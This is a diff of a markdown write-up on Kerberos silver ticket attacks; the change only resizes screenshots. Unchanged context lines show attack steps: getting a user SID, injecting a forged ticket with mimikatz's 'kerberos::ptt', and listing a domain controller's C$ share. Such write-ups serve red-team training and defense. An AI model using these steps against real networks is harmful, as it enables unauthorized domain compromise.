@@ -72,7 +72,7 @@ Getting a user's SID
 ```
 whoami /user
 ```
-<img src="/img/silver/sid.PNG" alt="Getting-gz" width="1000" height="150"> 
+<img src="/img/silver/sid.PNG" alt="Getting-gz" width="800" height="150"> 
 
 ## Create the silver ticket
 ```
@@ -102,10 +102,10 @@ Inject in memory using mimikatz
 kerberos::ptt  ticket.kirbi
 ```
   
-<img src="/img/silver/f2.PNG" alt="Getting-gz" width="1000" height="200"> 
+<img src="/img/silver/f2.PNG" alt="Getting-gz" width="800" height="150"> 
 
 ## Access domain controller
 ```
 dir \\domainAD.karim.net\c$
 ```
-<img src="/img/silver/da.PNG" alt="Getting-gz" width="600" height="150"> 
+<img src="/img/silver/da.PNG" alt="Getting-gz" width="1000" height="200"> 
